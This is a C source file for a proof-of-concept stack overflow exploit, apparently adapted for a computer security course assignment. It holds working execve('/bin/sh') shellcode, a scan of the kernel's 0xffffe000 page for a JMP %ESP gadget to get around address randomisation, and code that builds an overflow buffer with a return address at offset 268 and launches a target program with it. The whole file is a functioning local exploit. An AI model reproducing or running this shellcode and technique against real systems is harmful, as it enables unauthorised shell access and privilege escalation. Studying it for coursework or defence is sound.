/*
 * va-exploit-poc.c, Exploiting va-vuln-poc.c 
 * under VA patch (Proof of Concept!)
 * - izik@tty64.org
 * Appropriated for CNS assignment by Nic
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = 
	"\x6a\x0b"              // push $0xb 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x52"                  // push %edx 
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80";             // int $0x80 

unsigned long find_esp(void) {
        int i;
        char *ptr = (char *) 0xffffe000;

	/* Search through memorry for a chunk of ram with the right bits */
	/* We look through this staticly linked shared object for the bits that say "jump to the stack pointer" */
        for (i = 0; i < 4095; i++) {

                if (ptr[i] == '\xff' && ptr[i+1] == '\xe4') {
			printf("* Found JMP %%ESP @ 0x%08x\n", ptr+i);
			return (unsigned long) ptr+i;
                }
        }

	return 0;
}

int main(int argc, char **argv) {

	char evilbuf[295];
	char *evilargs[] = { "./commanche", evilbuf , NULL };
	unsigned long retaddr;

	/* find the static memory address of the library we want to ping off */
	retaddr = find_esp();
	if (!retaddr) {
		printf("* No JMP %%ESP in this kernel!\n");
		return -1;
	}

	/* loading the weapon
	 * Fill the buffer with some random character (in this case A)
	 * put the return address 12 bytes beyong the end of the buffer
	 * put the code after the return address
	 */
	memset(evilbuf, 0x41, sizeof(evilbuf));
	memcpy(evilbuf+268, &retaddr, sizeof(long));
	memcpy(evilbuf+272, shellcode, sizeof(shellcode));

	execve("./commanche", evilargs, NULL);
	return 1;
}

